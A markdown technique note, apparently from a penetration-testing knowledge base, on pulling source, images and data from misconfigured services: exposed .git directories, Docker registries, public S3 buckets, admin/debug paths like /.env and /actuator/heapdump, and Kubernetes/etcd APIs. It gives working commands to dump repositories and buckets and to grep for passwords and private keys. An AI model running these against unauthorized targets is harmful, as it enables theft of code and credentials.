---
category: technique
title: "Exposed Services - Git, Docker Registries, Cloud Storage, Misc"
tags: [tools, exposed-git, docker-registry, git-dumper, crane, misconfiguration, recon]
---

# Exposed Services

Misconfigurations that give you direct access to source code, images, or data without any exploitation.

## Exposed .git directories

If a site has `/.git/` accessible, you can reconstruct the entire source tree even if directory listing is off.

```bash
pip install git-dumper

# check first
curl -s https://example.com/.git/HEAD

# dump everything
git-dumper https://example.com/.git/ ./output/
cd output && git log --oneline    # read the full history
```

GitHacker handles partial dumps better when some objects are missing:

```bash
pip install githacker
githacker --url https://example.com/.git/ --output ./output
```

After dumping - run trufflehog or gitleaks on the result immediately:

```bash
trufflehog git file://./output --only-verified
gitleaks detect --source ./output -v
```

## Exposed Docker registries

An unauthenticated registry on port 5000 or 5001 usually means full read access to production images.

```bash
# check if it's open
curl https://registry.example.com/v2/
curl https://registry.example.com/v2/_catalog    # list all repos

# install crane
go install github.com/google/go-containerregistry/cmd/crane@latest

crane catalog registry.example.com               # list repos
crane ls registry.example.com/app                # list tags
crane config registry.example.com/app:latest     # inspect config
crane pull registry.example.com/app:latest app.tar && tar -xf app.tar
```

Once you have the image layers, look for secrets baked into the filesystem:

```bash
# extract and search
mkdir layers && tar -xf app.tar -C layers/
grep -r "password\|secret\|api_key\|DB_PASS" layers/ 2>/dev/null
find layers/ -name "*.env" -o -name "*.key" -o -name "id_rsa" 2>/dev/null
```

DockerRegistryGrabber pulls everything from a registry in one shot:

```bash
git clone https://github.com/Syzik/DockerRegistryGrabber
pip install -r DockerRegistryGrabber/requirements.txt
python3 DockerRegistryGrabber/drg.py https://registry.example.com --dump all
```

## Exposed S3 / cloud storage

```bash
# check if bucket is public
curl -s https://example-bucket.s3.amazonaws.com/

# list contents
aws s3 ls s3://example-bucket --no-sign-request

# download everything
aws s3 sync s3://example-bucket ./output --no-sign-request

# find buckets by name guessing
pip install s3scanner
s3scanner scan --bucket example-company-dev
s3scanner scan --bucket example-company-backup
```

## Exposed admin panels and dev tools

Things that nuclei catches but worth knowing manually:

```bash
# common paths worth checking on any target
/.env
/.env.local
/.env.production
/api/swagger.json
/api/openapi.json
/graphql                # introspection often enabled in prod
/admin
/jenkins
/actuator               # Spring Boot - dumps env, beans, heap
/actuator/env
/actuator/heapdump
/console                # H2 database console
/phpinfo.php
```

feroxbuster with the right wordlist finds these automatically, but knowing what you're looking for helps filter the noise.

## Exposed Kubernetes

```bash
# unauthenticated API server
curl https://k8s.example.com:6443/api/v1/namespaces
curl https://k8s.example.com:6443/api/v1/pods

# etcd (almost always exposed internally)
curl http://etcd.example.com:2379/v2/keys/?recursive=true

# kubelet API (port 10250)
curl -sk https://node.example.com:10250/pods
```
